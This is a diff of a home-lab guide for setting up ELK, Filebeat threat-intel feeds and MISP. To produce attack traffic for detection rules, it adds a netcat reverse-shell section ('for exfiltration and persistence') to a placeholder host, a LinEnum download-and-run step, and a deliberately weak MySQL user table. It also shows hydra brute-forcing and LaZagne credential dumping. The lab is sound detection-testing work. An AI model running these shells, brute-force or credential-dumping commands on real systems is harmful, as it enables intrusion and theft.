@@ -141,55 +141,6 @@ sudo service auditbeat start
 <!---
 *******************************************************************************
 -->
-
-# THREATINTEL - FILEBEAT  MODULE ACTIVATION (TO SEND IOC TO ELK)
-
-## THREATINTEL - FILEBEAT - Activate the threatintel module
-```
-sudo filebeat modules enable threatintel
-```
-
-## THREATINTEL - FILEBEAT - Activate your feeds
-```
-sudo vi /etc/filebeat/modules.d/threatintel.yml 
-```
-
-Example :
-	- module: threatintel
-	  abuseurl:
-		enabled: true
-
-## THREATINTEL - FILEBEAT - For AlienVault, get your API key here and add it to threatintel.yml
-Link here: [https://otx.alienvault.com/api]
-
-## THREATINTEL - FILEBEAT - The authentication token used to contact the OTX API, can be found on the OTX UI.
-```
-var.api_token: put-your-key-here
-```
-
-
-
-<!---
-*******************************************************************************
--->
-# THREATINTEL - KIBANA INDICATORS
-
-## THREATINTEL - KIBANA INDICATORS - Add the threatintel integration
-```
-# Not useful, works with the intel integration in Kibana? [http://localhost:5601/app/integrations/detail/ti_util-1.1.0/overview] (2023-02-08)
-```
-
-## THREATINTEL - KIBANA INDICATORS - Validate the ingestion here
-```
-[http://localhost:5601/app/security/threat_intelligence/indicators]
-
-# I cannot publish the URL directly as it use a token in the URL
-Look at this dashboard too : [Filebeat Threat Intel] AlienVault OTX
-```
-
-<!---
-*******************************************************************************
--->
 # FILEBEAT SETUP + CONFIGURATION
 
 Reference : https://www.elastic.co/guide/en/beats/filebeat/current/filebeat-installation-configuration.html
@@ -449,6 +400,56 @@ output.elasticsearch.allow_older_versions to true
 <!---
 *******************************************************************************
 -->
+
+# THREATINTEL - FILEBEAT  MODULE ACTIVATION (TO SEND IOC TO ELK)
+
+## THREATINTEL - FILEBEAT - Activate the threatintel module
+```
+sudo filebeat modules enable threatintel
+```
+
+## THREATINTEL - FILEBEAT - Activate your feeds
+```
+sudo vi /etc/filebeat/modules.d/threatintel.yml 
+```
+
+Example :
+	- module: threatintel
+	  abuseurl:
+		enabled: true
+
+## THREATINTEL - FILEBEAT - For AlienVault, get your API key here and add it to threatintel.yml
+Link here: [https://otx.alienvault.com/api]
+
+## THREATINTEL - FILEBEAT - The authentication token used to contact the OTX API, can be found on the OTX UI.
+```
+var.api_token: put-your-key-here
+```
+
+
+
+<!---
+*******************************************************************************
+-->
+# THREATINTEL - KIBANA INDICATORS
+
+## THREATINTEL - KIBANA INDICATORS - Add the threatintel integration
+```
+# Not useful, works with the intel integration in Kibana? [http://localhost:5601/app/integrations/detail/ti_util-1.1.0/overview] (2023-02-08)
+```
+
+## THREATINTEL - KIBANA INDICATORS - Validate the ingestion here
+```
+[http://localhost:5601/app/security/threat_intelligence/indicators]
+
+# I cannot publish the URL directly as it use a token in the URL
+Look at this dashboard too : [Filebeat Threat Intel] AlienVault OTX
+```
+
+
+<!---
+*******************************************************************************
+-->
 # IOC - TEST A THREAT INTELLIGENCE IOC DETECTION BY A KIBANA RULE
 
 ## IOC - Rule to activate, by default not all rules are activated
@@ -584,6 +585,31 @@ Expected results are :
 > KQL = message: (SharpHound or BloodHound)  More to come...
 
 
+
+
+<!---
+*******************************************************************************
+-->
+Reference : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd
+
+# REVERSE SHELL FOR EXFILTRATION AND PERSISTENCE
+| Always try to use a web port to hide ine the usual traffic
+
+## On the attacker system
+| The first step is to start a listener on the attacker box, so the victim will connect (reverse = from the victim to the attacker outside your network)
+| No need to specify the ip adress as it will bind to 0.0.0.0
+```
+nc -nlvp 8080
+```
+
+## On the victim system
+| The second step is to connect to the attacker and give acces to the victim shell
+```
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x 8080 >/tmp/f
+```
+
+
+
 <!---
 *******************************************************************************
 -->
@@ -621,8 +647,12 @@ hydra -t 1 -V -f -I -l poly -P /usr/share/wordlists/rockyou.txt 192.168.6.128 MY
 
 	Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 
-->->->->->-> mysql> use mysql; select * from user;
-->->->->->-> mysql> use dbUtilisateurs; select * from utilisateurs;
+->->->->->-> 
+show databases;
+use dbUtilisateurs;
+show tables;
+select * from utilisateurs where admin = 1;
+
 ```
 
 ## GENERATE TRAFFIC - Web directory bruteforce
@@ -637,6 +667,14 @@ Reference : [https://github.com/AlessandroZ/LaZagne]
 ```
 sudo python3 laZagne.py all -v
 ```
+## GENERATE TRAFFIC - LinEnum execution
+Reference : [https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh]
+
+```
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+chmod +x LinEnum.sh
+./LinEnum.sh > linenum.txt
+```
 
 
 
@@ -645,6 +683,13 @@ sudo python3 laZagne.py all -v
 
 ## NEW RULES TO TEST!!!
 sudo rm -f /var/log/apache2/error.log 
+
+<!---
+*******************************************************************************
+-->
+# ELK RULE CREATION
+Reference [https://www.elastic.co/guide/en/security/current/rules-ui-create.html]
+
 
 <!---
 *******************************************************************************
@@ -735,10 +780,12 @@ sudo mysql -u root
 
 # Create a new user
 CREATE USER 'mysqladmin'@'localhost' IDENTIFIED BY 'princess';
-GRANT ALL ON *.* TO 'mysqladmin'@'localhost';
+GRANT ALL PRIVILEGES ON *.* TO 'mysqladmin'@'localhost';
 
 #mysql> CREATE USER 'root'@'192.168.6.130' IDENTIFIED BY 'princess';
 #mysql> GRANT ALL PRIVILEGES ON database_name.* TO 'root'@'192.168.6.130';
+
+```
 
 ```
 sudo vi /etc/mysql/mysql.conf.d/mysqld.cnf 
@@ -756,16 +803,15 @@ slow_query_log_file = /var/log/mysql/mysql-slow.log
 long_query_time = 0
 log_queries_not_using_indexes = 1
 ```
-## MYSQL - Login with new user
-
-```
-sudo mysql -u mysqladmin -p
-```
 
 ## MYSQL - Create a weak user table based on public information...
 Reference [https://sites.google.com/site/morinetkevin/competences-obligatoires/permettre-une-inscription-utilisateur-en-utilisant-mysql-php-html-et-css]
 
 ```
+sudo mysql -u mysqladmin -p
+
+drop database if exists dbUtilisateur;
+
 create database dbUtilisateur;
 
 use dbUtilisateur;
@@ -774,16 +820,17 @@ drop table if exists utilisateurs;
 
 create table utilisateurs(
  id int,
+ admin int,
  nom varchar(50),
  prenom varchar(30),
  email  varchar(50),
  telephone varchar(10),
  login varchar(30),
- motDePasse varchar(50),
+ motDePasse varchar(64),
 PRIMARY KEY (id));
 
-insert into utilisateurs(id, nom, prenom, email, telephone, login, motDePasse) values (1, 'john', 'doe', 'myjohn@john.io', '5145555555', 'jdoe', '123456');
-insert into utilisateurs(id, nom, prenom, email, telephone, login, motDePasse) values (2, 'john', 'travolta', 'myjohn@notjohn.io', '5144877455', 'jt', 'rockit');
+insert into utilisateurs(id, admin, nom, prenom, email, telephone, login, motDePasse) values (1, 1, 'john', 'doe', 'myjohn@john.io', '5145555555', 'jdoe', '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8');
+insert into utilisateurs(id, admin, nom, prenom, email, telephone, login, motDePasse) values (2, 1, 'john', 'travolta', 'myjohn@notjohn.io', '5144877455', 'jt', '04e77bf8f95cb3e1a36a59d1e93857c411930db646b46c218a0352e432023cf2');
  
 ```
 
@@ -834,7 +881,7 @@ sudo docker compose up
 
 ## MISP - Activate feeds
 
-'https://localhost/feeds/index'
+[https://localhost/feeds/index]
 
 > "Enable selected"
 
@@ -903,12 +950,26 @@ sudo ufw default allow outgoing
 sudo ufw enable
 service ufw restart
 
-apt-get install gufw
+sudo apt install gufw
+```
+
+## UBUNTU - VMWARE Install
+> Before installation you must install this package
+
+```
+sudo apt install gcc build-essential
+```
+
+But I switch to VirtualBox as I got the error @@BINARY@@
+
+```
+sudo apt-get install virtualbox
 ```
 
 ## UBUNTU - VMWARE disk full
 
-'https://communities.vmware.com/t5/VMware-Workstation-Player/VMware-Player-has-paused-this-virtual-machine/td-p/1192117'
+[https://communities.vmware.com/t5/VMware-Workstation-Player/VMware-Player-has-paused-this-virtual-machine/td-p/1192117']
+
 
 > For security reasons, VMware doesn't allow VM's to start/run if there is not enough free disk space available. This is a percentage of the partition size.
 > You can override this with mainMem.freeSpaceCheck = "FALSE" (see http://sanbarrow.com/vmx/vmx-advanced.html#vmx)
